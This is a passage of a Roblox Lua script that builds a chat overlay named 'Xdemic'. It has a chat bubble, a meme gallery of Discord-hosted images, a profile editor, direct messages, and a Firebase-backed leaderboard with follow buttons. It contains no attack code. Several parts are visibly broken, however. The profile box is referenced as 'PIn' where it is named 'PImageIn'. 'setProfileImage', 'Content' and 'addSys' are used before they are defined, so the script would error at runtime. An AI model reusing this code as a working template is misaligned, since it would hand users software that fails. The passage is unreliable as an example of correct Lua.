    local translated = translateText(ctxText, "en")
    if translated and translated ~= ctxText then
        addSys("Translated: "..translated)
    else
        addSys("Translation failed or text already in English.")
    end
    CtxMenu.Visible=false
end)
ctxClose.MouseButton1Click:Connect(function() CtxMenu.Visible=false end)

UIS.InputBegan:Connect(function(inp)
    if inp.UserInputType~=Enum.UserInputType.MouseButton1 and inp.UserInputType~=Enum.UserInputType.Touch then return end
    if CtxMenu.Visible then
        local a=CtxMenu.AbsolutePosition local s=CtxMenu.AbsoluteSize local p=inp.Position
        if p.X<a.X or p.X>a.X+s.X or p.Y<a.Y or p.Y>a.Y+s.Y then CtxMenu.Visible=false end
    end
    if QuickActionMenu.Visible then
        local a=QuickActionMenu.AbsolutePosition local s=QuickActionMenu.AbsoluteSize local p=inp.Position
        if p.X<a.X or p.X>a.X+s.X or p.Y<a.Y or p.Y>a.Y+s.Y then QuickActionMenu.Visible=false end
    end
end)

-- ============================================================
--  BUBBLE TRIGGER BUTTON (unchanged)
-- ============================================================
local BubFrame=make("Frame",{Size=UDim2.new(0,54,0,54),Position=UDim2.new(1,-68,1,-92),BackgroundColor3=Color3.fromRGB(45,45,55),BackgroundTransparency=0.08,ZIndex=800,Parent=Gui})
corner(BubFrame,27) stroke(BubFrame,Color3.fromRGB(80,100,200),1.5)
local Glow=make("Frame",{Size=UDim2.new(1,14,1,14),Position=UDim2.new(0,-7,0,-7),BackgroundColor3=C.BLUE,BackgroundTransparency=0.75,ZIndex=799,Parent=BubFrame})
corner(Glow,34)
local BubBtn=make("TextButton",{Size=UDim2.new(1,0,1,0),BackgroundTransparency=1,Text="💬",TextSize=26,Font=Enum.Font.GothamBold,TextColor3=C.WHITE,ZIndex=801,Parent=BubFrame})
local NDot=make("Frame",{Size=UDim2.new(0,14,0,14),Position=UDim2.new(1,-4,0,-4),BackgroundColor3=C.RED,Visible=false,ZIndex=802,Parent=BubFrame})
corner(NDot,7)

local function pulse()
    tw(Glow,1,{BackgroundTransparency=0.9,Size=UDim2.new(1,20,1,20),Position=UDim2.new(0,-10,0,-10)})
    task.delay(1,function() tw(Glow,0.6,{BackgroundTransparency=0.75,Size=UDim2.new(1,14,1,14),Position=UDim2.new(0,-7,0,-7)}) task.delay(0.7,pulse) end)
end
pulse() makeDraggable(BubFrame,BubFrame)

-- ============================================================
--  LEADERBOARD UI (New Tab)
-- ============================================================
local LeaderboardPage = make("Frame",{Size=UDim2.new(1,0,1,0),BackgroundTransparency=1,Visible=false,ZIndex=501,Parent=Content})
local LBTitle = make("TextLabel",{
    Size=UDim2.new(1,0,0,30),
    BackgroundTransparency=1,
    Text="🏆 LEADERBOARD",
    TextColor3=C.WHITE,
    TextSize=14,
    Font=Enum.Font.GothamBold,
    Parent=LeaderboardPage
})
local LBScroll = make("ScrollingFrame",{
    Size=UDim2.new(1,-6,1,-38),
    Position=UDim2.new(0,3,0,34),
    BackgroundTransparency=1,
    ScrollBarThickness=2,
    ScrollBarImageColor3=C.BLUE,
    CanvasSize=UDim2.new(0,0,0,0),
    AutomaticCanvasSize=Enum.AutomaticSize.Y,
    Parent=LeaderboardPage
})
ll(LBScroll, Enum.FillDirection.Vertical, 2)

local function updateLeaderboard()
    for _, child in ipairs(LBScroll:GetChildren()) do if child:IsA("Frame") then child:Destroy() end end

    if FIREBASE_URL == "https://YOUR-PROJECT-ID-default-rtdb.firebaseio.com/" then
        local noData = make("TextLabel",{
            Size=UDim2.new(1,0,0,60),
            BackgroundTransparency=1,
            Text="⚠️ Firebase not configured.\nSet FIREBASE_URL to sync leaderboard.",
            TextColor3=C.GRAY,
            TextSize=12,
            Font=Enum.Font.Gotham,
            TextWrapped=true,
            Parent=LBScroll
        })
        return
    end

    local response = makeHttpRequest({
        Url = FIREBASE_URL .. "profiles.json?orderBy=\"xp\"&limitToLast=20",
        Method = "GET",
    })
    if response and response.StatusCode == 200 then
        local ok, data = pcall(function() return HttpSvc:JSONDecode(response.Body) end)
        if ok and type(data) == "table" then
            local sorted = {}
            for name, info in pairs(data) do
                table.insert(sorted, {name=name, info=info})
            end
            table.sort(sorted, function(a,b) return (a.info.xp or 0) > (b.info.xp or 0) end)

            for i, entry in ipairs(sorted) do
                local row = make("Frame",{
                    Size=UDim2.new(1,-4,0,32),
                    BackgroundColor3=(i%2==0) and Color3.fromRGB(45,45,55) or Color3.fromRGB(50,50,60),
                    BackgroundTransparency=0.3,
                    Parent=LBScroll
                })
                corner(row,6)

                local rank = make("TextLabel",{
                    Size=UDim2.new(0,30,1,0),
                    BackgroundTransparency=1,
                    Text=(i<=3) and {"🥇","🥈","🥉"}[i] or "#"..i,
                    TextColor3=C.WHITE,
                    TextSize=12,
                    Font=Enum.Font.GothamBold,
                    TextXAlignment=Enum.TextXAlignment.Center,
                    Parent=row
                })

                local nameLabel = make("TextLabel",{
                    Size=UDim2.new(0,90,1,0),
                    Position=UDim2.new(0,34,0,0),
                    BackgroundTransparency=1,
                    Text=entry.info.displayName or entry.name,
                    TextColor3=C.WHITE,
                    TextSize=11,
                    Font=Enum.Font.Gotham,
                    TextXAlignment=Enum.TextXAlignment.Left,
                    Parent=row
                })

                local stats = make("TextLabel",{
                    Size=UDim2.new(0,90,1,0),
                    Position=UDim2.new(1,-94,0,0),
                    BackgroundTransparency=1,
                    Text="⭐"..(entry.info.xp or 0).."  👥"..(entry.info.followers or 0),
                    TextColor3=C.GRAY,
                    TextSize=10,
                    Font=Enum.Font.Gotham,
                    TextXAlignment=Enum.TextXAlignment.Right,
                    Parent=row
                })

                -- Follow button
                local followBtn = make("TextButton",{
                    Size=UDim2.new(0,50,1,-4),
                    Position=UDim2.new(1,-148,0,2),
                    BackgroundColor3=C.BLUE,
                    Text="Follow",
                    TextColor3=C.WHITE,
                    TextSize=10,
                    Font=Enum.Font.GothamBold,
                    Parent=row
                })
                corner(followBtn,4)
                if entry.name == Player.Name then
                    followBtn.Visible = false
                else
                    local isFollowing = false
                    for _, f in ipairs(FollowSystem.Following) do
                        if f == entry.name then isFollowing = true break end
                    end
                    followBtn.Text = isFollowing and "Unfollow" or "Follow"
                    followBtn.BackgroundColor3 = isFollowing and C.RED or C.BLUE
                    followBtn.MouseButton1Click:Connect(function()
                        local nowFollowing = followPlayer(entry.name)
                        followBtn.Text = nowFollowing and "Unfollow" or "Follow"
                        followBtn.BackgroundColor3 = nowFollowing and C.RED or C.BLUE
                        showToast("Follow", nowFollowing and "You followed "..entry.name or "You unfollowed "..entry.name, nil, nowFollowing and "✅" or "❌")
                        updateLeaderboard()
                    end)
                end
            end
        end
    end
end

-- ============================================================
--  MAIN UI SHELL (Tabs extended)
-- ============================================================
local Win=make("Frame",{Name="XdemicWin",Size = UDim2.new(0,380,0,320),Position = UDim2.new(0.5,-190,0.5,-160),BackgroundColor3=C.WIN,BackgroundTransparency=0.28,Visible=false,ZIndex=500,Parent=Gui})
corner(Win,16) stroke(Win,Color3.fromRGB(58,58,76),1.5)

local DragHandle=make("Frame",{Size=UDim2.new(1,-36,0,44),BackgroundTransparency=1,ZIndex=501,Parent=Win})
local XBtn=make("TextButton",{Size=UDim2.new(0,24,0,24),Position=UDim2.new(1,-30,0,10),BackgroundColor3=C.RED,Text="✕",TextColor3=C.WHITE,TextSize=13,Font=Enum.Font.GothamBold,ZIndex=502,Parent=Win})
corner(XBtn,7)

local TabBar=make("Frame",{Size=UDim2.new(1,0,0,44),BackgroundColor3=C.TABBAR,BackgroundTransparency=0.15,ZIndex=501,Parent=Win})
corner(TabBar,16)
make("Frame",{Size=UDim2.new(1,0,0,16),Position=UDim2.new(0,0,1,-16),BackgroundColor3=C.TABBAR,BackgroundTransparency=0.15,BorderSizePixel=0,ZIndex=501,Parent=TabBar})

local TabScroll=make("ScrollingFrame",{Size=UDim2.new(1,-34,1,0),BackgroundTransparency=1,ScrollBarThickness=0,CanvasSize=UDim2.new(0,0,0,0),AutomaticCanvasSize=Enum.AutomaticSize.X,ZIndex=502,Parent=TabBar})
ll(TabScroll,Enum.FillDirection.Horizontal,0)

local TABS={
    {name="SERVER", icon="🌐"},
    {name="GALLERY", icon="🖼"},
    {name="PROFILE", icon="⚙️"},
    {name="VOICE", icon="🎵"},
    {name="DMs", icon="💬"},
    {name="LEADERBOARD", icon="🏆"}
}
local tabBtns={}
for i,t in ipairs(TABS) do
    local btn=make("TextButton",{Size=UDim2.new(0,84,1,0),BackgroundTransparency=1,Text=t.icon.." "..t.name,TextSize=10,Font=Enum.Font.GothamBold,TextColor3=C.GRAY,ZIndex=503,LayoutOrder=i,Parent=TabScroll})
    local ul=make("Frame",{Size=UDim2.new(0,50,0,2),Position=UDim2.new(0.5,-25,1,-2),BackgroundColor3=C.BLUE,BackgroundTransparency=1,ZIndex=503,Parent=btn})
    tabBtns[t.name]={b=btn,ul=ul}
end

local Content=make("Frame",{Size=UDim2.new(1,0,1,-44),Position=UDim2.new(0,0,0,44),BackgroundTransparency=1,ClipsDescendants=true,ZIndex=501,Parent=Win})

-- ============================================================
--  SERVER PAGE (unchanged)
-- ============================================================
local SrvPage=make("Frame",{Size=UDim2.new(1,0,1,0),BackgroundTransparency=1,ZIndex=501,Parent=Content})
MsgScroll=make("ScrollingFrame",{Size=UDim2.new(1,-6,1,-56),Position=UDim2.new(0,3,0,3),BackgroundTransparency=1,ScrollBarThickness=2,ScrollBarImageColor3=C.BLUE,CanvasSize=UDim2.new(0,0,0,0),AutomaticCanvasSize=Enum.AutomaticSize.Y,ZIndex=502,Parent=SrvPage})
ll(MsgScroll,Enum.FillDirection.Vertical,5)
make("UIPadding",{PaddingLeft=UDim.new(0,6),PaddingRight=UDim.new(0,6),PaddingTop=UDim.new(0,4),Parent=MsgScroll})

local IBar=make("Frame",{Size=UDim2.new(1,-10,0,48),Position=UDim2.new(0,5,1,-52),BackgroundColor3=C.INPUT,BackgroundTransparency=0.1,ZIndex=503,Parent=SrvPage})
corner(IBar,24) stroke(IBar,Color3.fromRGB(58,58,76),1)
local CInput=make("TextBox",{Size=UDim2.new(1,-120,1,-8),Position=UDim2.new(0,14,0,4),BackgroundTransparency=1,PlaceholderText="iMessage Z-Chat...",PlaceholderColor3=C.GRAY,Text="",TextColor3=C.WHITE,TextSize=13,Font=Enum.Font.Gotham,TextXAlignment=Enum.TextXAlignment.Left,ClearTextOnFocus=false,ZIndex=504,Parent=IBar})
local CamBtn=make("TextButton",{Size=UDim2.new(0,32,0,32),Position=UDim2.new(1,-112,0.5,-16),BackgroundTransparency=1,Text="📷",TextSize=22,ZIndex=504,Parent=IBar})
local MBtn=make("TextButton",{Size=UDim2.new(0,32,0,32),Position=UDim2.new(1,-74,0.5,-16),BackgroundTransparency=1,Text="🌸",TextSize=22,ZIndex=504,Parent=IBar})
local SBtn=make("TextButton",{Size=UDim2.new(0,40,0,40),Position=UDim2.new(1,-46,0.5,-20),BackgroundColor3=C.BLUE,Text="↑",TextColor3=C.WHITE,TextSize=24,Font=Enum.Font.GothamBold,ZIndex=504,Parent=IBar})
corner(SBtn,20)

local URLBox=make("Frame",{Size=UDim2.new(1,-10,0,64),Position=UDim2.new(0,5,1,-124),BackgroundColor3=C.BG2,Visible=false,ZIndex=510,Parent=SrvPage})
corner(URLBox,10) stroke(URLBox,Color3.fromRGB(55,55,72))
local URLInput=make("TextBox",{Size=UDim2.new(1,-80,0,32),Position=UDim2.new(0,5,0,28),BackgroundColor3=C.INPUT,PlaceholderText="rbxassetid://... or https://...",PlaceholderColor3=C.GRAY,Text="",TextColor3=C.WHITE,TextSize=11,Font=Enum.Font.Gotham,ClearTextOnFocus=false,ZIndex=511,Parent=URLBox})
corner(URLInput,6)
local URLSend=make("TextButton",{Size=UDim2.new(0,68,0,32),Position=UDim2.new(1,-73,0,28),BackgroundColor3=C.BLUE,Text="Send 📷",TextColor3=C.WHITE,TextSize=11,Font=Enum.Font.GothamBold,ZIndex=511,Parent=URLBox})
corner(URLSend,6)

-- ============================================================
--  CHAT ELEMENT POPULATION (unchanged except addMsg uses new bubble)
-- ============================================================
local function addSys(text)
    local f=make("Frame",{Size=UDim2.new(1,-4,0,42),BackgroundColor3=C.SYSBG,BackgroundTransparency=0.1,ZIndex=503,Parent=MsgScroll})
    corner(f,8) stroke(f,Color3.fromRGB(115,90,10))
    make("TextLabel",{Size=UDim2.new(1,-14,1,0),Position=UDim2.new(0,7,0,0),BackgroundTransparency=1,Text="⚠ [SYSTEM] : "..text,TextColor3=C.SYSTXT,TextSize=12,Font=Enum.Font.GothamBold,TextWrapped=true,TextXAlignment=Enum.TextXAlignment.Left,ZIndex=504,Parent=f})
    task.delay(0.05,function() MsgScroll.CanvasPosition=Vector2.new(0,MsgScroll.AbsoluteCanvasSize.Y) end)
end

local function addMsg(sender, text, isImg, imgUrl, overrideDisplayName)
    if ScriptBans[sender] then
        if sender == Player.Name then
            Gui:Destroy()
            Player:Kick("\n[XDEMIC CHAT]\nScript interaction violation detected.")
        end
        return
    end
    if MutedPlayers.All or MutedPlayers[sender] then return end

    local isMe=(sender==Player.Name)
    local pObj=Players:FindFirstChild(sender)
    local uid=pObj and pObj.UserId or 0

    local currentDisplayName = overrideDisplayName or (isMe and ClientProfileData.DisplayName or (pObj and pObj.DisplayName or sender))

    local wrap=make("Frame",{
        Size=UDim2.new(1,-4,0,0),
        AutomaticSize=Enum.AutomaticSize.Y,
        BackgroundTransparency=1,
        ZIndex=503,
        Parent=MsgScroll
    })

    local horizontalLayout = make("UIListLayout", {
        FillDirection = Enum.FillDirection.Horizontal,
        SortOrder = Enum.SortOrder.LayoutOrder,
        Padding = UDim.new(0,10),
        VerticalAlignment = Enum.VerticalAlignment.Top,
        Parent = wrap
    })

    local av=make("ImageButton",{
        Size=UDim2.new(0,36,0,36),
        BackgroundColor3=C.BG3,
        Image="https://www.roblox.com/headshot-thumbnail/image?userId="..uid.."&width=100&height=100&format=png",
        LayoutOrder=1,
        ZIndex=504,
        Parent=wrap
    })
    corner(av,18)
    av.MouseButton1Click:Connect(function()
        openQuickAction(sender, UIS:GetMouseLocation())
    end)

    local bub=make("Frame",{
        Size=isImg and UDim2.new(0,140,0,140) or UDim2.new(0.82, -46, 0, 0),
        AutomaticSize=isImg and Enum.AutomaticSize.None or Enum.AutomaticSize.Y,
        BackgroundColor3=C.THEM,
        BackgroundTransparency=0.08,
        LayoutOrder=2,
        ZIndex=504,
        Parent=wrap
    })
    corner(bub,12)

    if isImg then
        local imgLabel = make("ImageLabel",{Size=UDim2.new(1,-8,1,-8),Position=UDim2.new(0,4,0,4),BackgroundTransparency=1,Image=getImageAsset(imgUrl),ZIndex=505,Parent=bub})
        corner(imgLabel, 8)
    else
        local lbl=make("TextLabel",{
            Size=UDim2.new(1,-16,0,0),AutomaticSize=Enum.AutomaticSize.Y,Position=UDim2.new(0,8,0,6),
            BackgroundTransparency=1,Text="",RichText=true,
            TextColor3=C.WHITE,TextSize=13,Font=Enum.Font.Gotham,TextWrapped=true,TextXAlignment=Enum.TextXAlignment.Left,ZIndex=505,Parent=bub
        })
        if isCreator(sender) then
            registerRichRGB(lbl, currentDisplayName, text)
        else
            lbl.Text = "<b>"..currentDisplayName..":</b> "..text
        end
        make("Frame",{Size=UDim2.new(1,0,0,12),BackgroundTransparency=1,ZIndex=504,Parent=bub})

        bub.InputBegan:Connect(function(inp)
            if inp.UserInputType==Enum.UserInputType.MouseButton2 then
                showCtx(text, UIS:GetMouseLocation().X, UIS:GetMouseLocation().Y)
            end
        end)
    end

    task.delay(0.05,function() MsgScroll.CanvasPosition=Vector2.new(0,MsgScroll.AbsoluteCanvasSize.Y) end)
    -- showBubble is now BXD style
    showBubble(sender, text, isImg, imgUrl)
end

-- ============================================================
--  MEME GALLERY (unchanged)
-- ============================================================
local GalleryPage=make("Frame",{Size=UDim2.new(1,0,1,0),BackgroundTransparency=1,Visible=false,ZIndex=501,Parent=Content})
local GScroll=make("ScrollingFrame",{Size=UDim2.new(1,-6,1,-12),Position=UDim2.new(0,3,0,6),BackgroundTransparency=1,ScrollBarThickness=4,ScrollBarImageColor3=C.BLUE,CanvasSize=UDim2.new(0,0,0,0),AutomaticCanvasSize=Enum.AutomaticSize.Y,ZIndex=502,Parent=GalleryPage})
make("UIGridLayout",{CellSize=UDim2.new(0,104,0,104),CellPadding=UDim2.new(0,12,0,12),Parent=GScroll})

function appendToMemeGalleryGrid(url, label)
    local cell=make("ImageButton",{Size=UDim2.new(0,104,0,104),BackgroundColor3=C.BG3,ScaleType=Enum.ScaleType.Stretch,ZIndex=503,Parent=GScroll})
    corner(cell,10) stroke(cell,Color3.fromRGB(55,55,75))
    task.spawn(function() cell.Image = getImageAsset(url) end)
    local tip=make("TextLabel",{Size=UDim2.new(1,0,0,20),Position=UDim2.new(0,0,1,-20),BackgroundColor3=Color3.fromRGB(0,0,0),BackgroundTransparency=0.4,Text=label,TextColor3=C.WHITE,TextSize=10,Font=Enum.Font.GothamBold,ZIndex=504,Parent=cell})
    cell.MouseButton1Click:Connect(function()
        addMsg(Player.Name,"",true,url)
        broadcastPayload(Player.Name, "", true, url)
        switchTab("SERVER")
    end)
end

-- (MEMES table defined as before)
local MEMES = {
    {url="https://cdn.discordapp.com/attachments/1487337813039906850/1509446357545390151/0136db63e4832b04191dc4ec6f192ec9.jpg?ex=6a1934f7&is=6a17e377&hm=1cc3d4ffa69be5cf5b6e27c7686304f3d93e439f1b970d246fdb6a759c701dfc&",  label="genz kiddo🥀"},
    {url="https://cdn.discordapp.com/attachments/1494973168547270677/1509626881052250142/3d44ba854fce0b5fdbfe5f34cb222e52.jpg?ex=6a19dd17&is=6a188b97&hm=3b5ac50e31e228132b49426dacdd025eba512dfe71895764f6b2960dfabe0607&",  label="idk"},
    {url="https://cdn.discordapp.com/attachments/1494973168547270677/1509628653150146591/Screenshot_20260529_001301_Roblox.jpg?ex=6a19debe&is=6a188d3e&hm=4374cb767be58c97e536a5ad7fe20883d7e13601209eeea4813bf4840ec20f40&",  label="shocked dog"},
    {url="https://cdn.discordapp.com/attachments/1494973168547270677/1509628653418446868/Screenshot_20260529_001245_Roblox.jpg?ex=6a19debe&is=6a188d3e&hm=926c27d1ef3902401fd6b60654812d3495d366518a6a51abf9fa8573a6df8ef6&",  label="big black lips"},
    {url="https://cdn.discordapp.com/attachments/1494973168547270677/1509909880855859251/Screenshot_20260529_184001_Roblox.jpg?ex=6a1ae4a8&is=6a199328&hm=d12022142b809a4d62021e1011102e44b04419b9c85fa1cce18309f0c639b9a4&", label="roblox wilding 💀"},
    {url="https://cdn.discordapp.com/attachments/1494973168547270677/1509909880121589760/Screenshot_20260529_184040_Roblox.jpg?ex=6a1ae4a8&is=6a199328&hm=873f25684a50fd9159c85584a6d713ac4c144817ea34ccf36ec34eafcfab80b7&", label="fit check 🔥"},
    {url="https://cdn.discordapp.com/attachments/1494973168547270677/1509909879685386411/Screenshot_20260529_184057_Roblox.jpg?ex=6a1ae4a8&is=6a199328&hm=06608b4557c3a921c8d86492d334dd82249fecc1989201f70c657fad6c37d98a&", label="no cap 🧢"},
    {url="YOUR_PEPE_SMUG_URL", label="let him cook 👨‍🍳"},
    {url="YOUR_PEPE_BUFF_URL", label="gigachad frog 💪"},
    {url="YOUR_FLORK_PUPPET_URL", label="bruh what 🤨"},
    {url = "", label = ""}, {url = "", label = ""}, {url = "", label = ""}, {url = "", label = ""},
    {url = "", label = ""}, {url = "", label = ""}, {url = "", label = ""}, {url = "", label = ""},
    {url = "", label = ""}, {url = "", label = ""}, {url = "", label = ""}, {url = "", label = ""},
    {url = "", label = ""}, {url = "", label = ""}, {url = "", label = ""}, {url = "", label = ""},
    {url = "", label = ""}, {url = "", label = ""}, {url = "", label = ""}, {url = "", label = ""},
    {url = "", label = ""}, {url = "", label = ""}, {url = "", label = ""}, {url = "", label = ""},
    {url = "", label = ""}, {url = "", label = ""}, {url = "", label = ""}, {url = "", label = ""}
}
for _,m in ipairs(MEMES) do appendToMemeGalleryGrid(m.url, m.label) end

local function loadSavedCustomGallery()
    local raw = Player.PlayerGui:GetAttribute("XdemicUserGalleryCache")
    if raw and raw ~= "" then
        local ok, data = pcall(function() return HttpSvc:JSONDecode(raw) end)
        if ok and type(data) == "table" then
            for _, customUrl in ipairs(data) do
                appendToMemeGalleryGrid(customUrl, "Saved Link 📥")
            end
        end
    end
end
loadSavedCustomGallery()

local function saveCustomUrlToGallery(url)
    local currentCache = {}
    local raw = Player.PlayerGui:GetAttribute("XdemicUserGalleryCache")
    if raw and raw ~= "" then
        local ok, data = pcall(function() return HttpSvc:JSONDecode(raw) end)
        if ok and type(data) == "table" then currentCache = data end
    end
    for _, existingUrl in ipairs(currentCache) do
        if existingUrl == url then return end
    end
    table.insert(currentCache, url)
    local ok, encoded = pcall(function() return HttpSvc:JSONEncode(currentCache) end)
    if ok then
        Player.PlayerGui:SetAttribute("XdemicUserGalleryCache", encoded)
        appendToMemeGalleryGrid(url, "Saved Link 📥")
    end
end

-- ============================================================
--  DYNAMIC PROFILE RENDERING (Extended with custom image)
-- ============================================================
local ProfPage=make("Frame",{Size=UDim2.new(1,0,1,0),BackgroundTransparency=1,Visible=false,ZIndex=501,Parent=Content})
make("TextLabel",{Size=UDim2.new(1,0,0,24),Position=UDim2.new(0,0,0,6),BackgroundTransparency=1,Text="✏️  EDIT ACCOUNT PROFILE",TextColor3=C.WHITE,TextSize=14,Font=Enum.Font.GothamBold,ZIndex=502,Parent=ProfPage})

local AvF=make("Frame",{Size=UDim2.new(0,70,0,70),Position=UDim2.new(0.5,-35,0,32),BackgroundColor3=C.BLUE,ZIndex=502,Parent=ProfPage})
corner(AvF,35)
local AvI=make("ImageLabel",{Size=UDim2.new(1,-4,1,-4),Position=UDim2.new(0,2,0,2),BackgroundTransparency=1,Image=ClientProfileData.ProfileImage,ZIndex=503,Parent=AvF})
corner(AvI,33)

local dynamicNameLabel=make("TextLabel",{Size=UDim2.new(1,-12,0,18),Position=UDim2.new(0,6,0,108),BackgroundTransparency=1,Text="Showing Profile: "..ClientProfileData.DisplayName,TextColor3=C.SYSTXT,TextSize=11,Font=Enum.Font.GothamBold,ZIndex=502,Parent=ProfPage})

local function mkBox(ph,y,h)
    local b=make("TextBox",{Size=UDim2.new(1,-14,0,h or 34),Position=UDim2.new(0,7,0,y),BackgroundColor3=C.BG3,BackgroundTransparency=0.15,PlaceholderText=ph,PlaceholderColor3=C.GRAY,Text="",TextColor3=C.WHITE,TextSize=12,Font=Enum.Font.Gotham,ClearTextOnFocus=false,ZIndex=502,Parent=ProfPage})
    corner(b,8) stroke(b,Color3.fromRGB(50,50,68)) return b
end
local DIn=mkBox("Change Display name...",132) DIn.Text=ClientProfileData.DisplayName
local BIn=mkBox("Write profile bio description...",170,54) BIn.MultiLine=true
local PImageIn=mkBox("Profile Image URL or Roblox User ID...",230,34) PIn.Text=ClientProfileData.ProfileImage or ""
local PImageBtn=make("TextButton",{Size=UDim2.new(0,80,0,34),Position=UDim2.new(1,-88,0,230),BackgroundColor3=C.BLUE,Text="Set Image",TextColor3=C.WHITE,TextSize=10,Font=Enum.Font.GothamBold,ZIndex=502,Parent=ProfPage})
corner(PImageBtn,6)
PImageBtn.MouseButton1Click:Connect(function()
    local input = PImageIn.Text
    if input and input ~= "" then
        setProfileImage(input)
        AvI.Image = ClientProfileData.ProfileImage
        addSys("Profile image updated.")
    end
end)

local SvB=make("TextButton",{Size=UDim2.new(1,-14,0,38),Position=UDim2.new(0,7,0,280),BackgroundColor3=C.BLUE,Text="APPLY CHANGES & SYNC",TextColor3=C.WHITE,TextSize=12,Font=Enum.Font.GothamBold,ZIndex=502,Parent=ProfPage})
corner(SvB,10)

SvB.MouseButton1Click:Connect(function()
    if DIn.Text ~= "" then
        ClientProfileData.DisplayName = DIn.Text
        ClientProfileData.Bio = BIn.Text
        dynamicNameLabel.Text = "Showing Profile: "..ClientProfileData.DisplayName
        saveProfileData()
        addSys("Profile saved successfully.")
        tw(SvB,0.1,{BackgroundColor3=C.GREEN})
        task.delay(0.5,function() tw(SvB,0.2,{BackgroundColor3=C.BLUE}) end)
    end
end)

local function setProfileImage(imageUrl)
    if imageUrl and imageUrl ~= "" then
        if tonumber(imageUrl) then
            ClientProfileData.ProfileImage = "https://www.roblox.com/headshot-thumbnail/image?userId="..imageUrl.."&width=150&height=150&format=png"
            ClientProfileData.RobloxId = tonumber(imageUrl)
        elseif string.match(imageUrl, "http") then
            ClientProfileData.ProfileImage = imageUrl
        else
            ClientProfileData.ProfileImage = "https://www.roblox.com/headshot-thumbnail/image?userId="..Player.UserId.."&width=150&height=150&format=png"
        end
        saveProfileData()
    end
end

-- ============================================================
--  DIRECT MESSAGES (unchanged)
-- ============================================================
local DMPage=make("Frame",{Size=UDim2.new(1,0,1,0),BackgroundTransparency=1,Visible=false,ZIndex=501,Parent=Content})
local DML=make("ScrollingFrame",{Size=UDim2.new(1,-6,1,-60),Position=UDim2.new(0,3,0,30),BackgroundTransparency=1,ScrollBarThickness=2,CanvasSize=UDim2.new(0,0,0,0),AutomaticCanvasSize=Enum.AutomaticSize.Y,ZIndex=502,Parent=DMPage})
ll(DML,Enum.FillDirection.Vertical,4)
local DMS=make("TextBox",{Size=UDim2.new(1,-6,0,32),Position=UDim2.new(0,3,1,-34),BackgroundColor3=C.INPUT,PlaceholderText="🔍  Search username to direct message...",PlaceholderColor3=C.GRAY,Text="",TextColor3=C.WHITE,TextSize=12,Font=Enum.Font.Gotham,ClearTextOnFocus=false,ZIndex=502,Parent=DMPage})
corner(DMS,16)

local CvView=make("Frame",{Size=UDim2.new(1,0,1,0),BackgroundColor3=C.WIN,BackgroundTransparency=0.05,Visible=false,ZIndex=515,Parent=DMPage})
local CvBack=make("TextButton",{Size=UDim2.new(0,62,0,26),Position=UDim2.new(0,4,0,4),BackgroundColor3=C.BG3,Text="← Back",TextColor3=C.WHITE,TextSize=11,Font=Enum.Font.GothamBold,ZIndex=516,Parent=CvView})
corner(CvBack,6)
local CvNm=make("TextLabel",{Size=UDim2.new(1,-80,0,26),Position=UDim2.new(0,72,0,4),BackgroundTransparency=1,Text="DM Target User",TextColor3=C.WHITE,TextSize=12,Font=Enum.Font.GothamBold,TextXAlignment=Enum.TextXAlignment.Left,ZIndex=516,Parent=CvView})
local CvScrl=make("ScrollingFrame",{Size=UDim2.new(1,-6,1,-72),Position=UDim2.new(0,3,0,36),BackgroundTransparency=1,ScrollBarThickness=2,CanvasSize=UDim2.new(0,0,0,0),AutomaticCanvasSize=Enum.AutomaticSize.Y,ZIndex=516,Parent=CvView})
ll(CvScrl,Enum.FillDirection.Vertical,4)
local CvIB=make("Frame",{Size=UDim2.new(1,-6,0,36),Position=UDim2.new(0,3,1,-38),BackgroundColor3=C.INPUT,ZIndex=516,Parent=CvView})
corner(CvIB,18) local CvIn=make("TextBox",{Size=UDim2.new(1,-50,1,-6),Position=UDim2.new(0,8,0,3),BackgroundTransparency=1,PlaceholderText="Type encrypted response message...",PlaceholderColor3=C.GRAY,Text="",TextColor3=C.WHITE,TextSize=12,Font=Enum.Font.Gotham,ClearTextOnFocus=false,ZIndex=517,Parent=CvIB})
local CvSnd=make("TextButton",{Size=UDim2.new(0,30,0,30),Position=UDim2.new(1,-34,0.5,-15),BackgroundColor3=C.BLUE,Text="↑",TextColor3=C.WHITE,TextSize=15,Font=Enum.Font.GothamBold,ZIndex=517,Parent=CvIB})
corner(CvSnd,15)

CvBack.MouseButton1Click:Connect(function() CvView.Visible=false dmTarget=nil end)

local function addDMMsg(scroll,sender,text,ts)
    if ScriptBans[sender] then return end
    local isMe=(sender==Player.Name)
    local b=make("Frame",{Size=UDim2.new(0.76,0,0,0),AutomaticSize=Enum.AutomaticSize.Y,Position=isMe and UDim2.new(0.24,0,0,0) or UDim2.new(0,0,0,0),BackgroundColor3=isMe and C.ME or C.THEM,ZIndex=520,Parent=scroll})
    corner(b,10)
    local l=make("TextLabel",{Size=UDim2.new(1,-10,0,0),AutomaticSize=Enum.AutomaticSize.Y,Position=UDim2.new(0,5,0,5),BackgroundTransparency=1,Text=text,TextColor3=C.WHITE,TextSize=12,Font=Enum.Font.Gotham,TextWrapped=true,TextXAlignment=Enum.TextXAlignment.Left,ZIndex=521,Parent=b})
    make("Frame",{Size=UDim2.new(1,0,0,12),BackgroundTransparency=1,ZIndex=520,Parent=b})
    task.delay(0.05,function() scroll.CanvasPosition=Vector2.new(0,scroll.AbsoluteCanvasSize.Y) end)
end

function addDMContact(username)
    if dmContacts[username] or ScriptBans[username] then return end dmContacts[username]=true
    local key=dmKey(Player.Name,username)
    local pMatch=Players:FindFirstChild(username)
    local targetId=pMatch and pMatch.UserId or 0
    local row=make("TextButton",{Name=username, Size=UDim2.new(1,-4,0,46),BackgroundColor3=C.BG2,Text="",ZIndex=503,Parent=DML})
    corner(row,8) stroke(row,Color3.fromRGB(50,50,65))
    local pimg=make("ImageLabel",{Size=UDim2.new(0,32,0,32),Position=UDim2.new(0,6,0,7),BackgroundColor3=C.BG3,Image="https://www.roblox.com/headshot-thumbnail/image?userId="..targetId.."&width=100&height=100&format=png",ZIndex=504,Parent=row})
    corner(pimg,16)
    make("TextLabel",{Size=UDim2.new(1,-50,1,0),Position=UDim2.new(0,46,0,0),BackgroundTransparency=1,Text="💬 "..username,TextColor3=C.WHITE,TextSize=12,Font=Enum.Font.GothamBold,TextXAlignment=Enum.TextXAlignment.Left,ZIndex=504,Parent=row})
    row.MouseButton1Click:Connect(function()
        dmTarget=username CvNm.Text="Direct Chat: @"..username CvView.Visible=true
        for _,c in ipairs(CvScrl:GetChildren()) do if c:IsA("Frame") then c:Destroy() end end
        for _,msg in ipairs(loadConvo(key)) do addDMMsg(CvScrl,msg.s,msg.t,msg.ts) end
    end)
end

local function sendDM()
